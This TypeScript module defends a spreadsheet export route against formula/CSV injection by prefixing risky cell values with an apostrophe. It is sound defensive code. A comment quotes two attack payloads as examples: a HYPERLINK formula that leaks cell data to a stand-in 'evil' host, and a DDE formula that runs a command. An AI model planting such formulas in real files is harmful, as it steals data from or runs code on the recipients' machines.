// Spreadsheet-safety helpers shared by the export route(s).
//
// Kept as a standalone, dependency-free module so the sanitizer can be unit
// tested in isolation. Previously the export route built cells inline with no
// sanitization at all, so there was no seam to test — the vulnerability lived
// in an untestable gap between "read fields" and "hand array to xlsx".

// Neutralize spreadsheet formula / CSV injection.
//
// Excel, LibreOffice Calc, and Google Sheets interpret a cell whose text
// begins with one of  = + - @  (or a leading TAB / CR) as a formula. Because
// recipient names, notes, department, and security code are free text that
// flows into export cells, a value such as
//   =HYPERLINK("http://evil/?"&A1&B1,"click")
// or the legacy DDE payload
//   =cmd|'/c calc'!A1
// would execute in the reader's spreadsheet when they open the export.
//
// Prefixing such a value with a single apostrophe is the standard, display-safe
// way to force the spreadsheet to treat the whole cell as literal text. The
// apostrophe is not shown to the user by the spreadsheet application.
export function sanitizeCell(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}
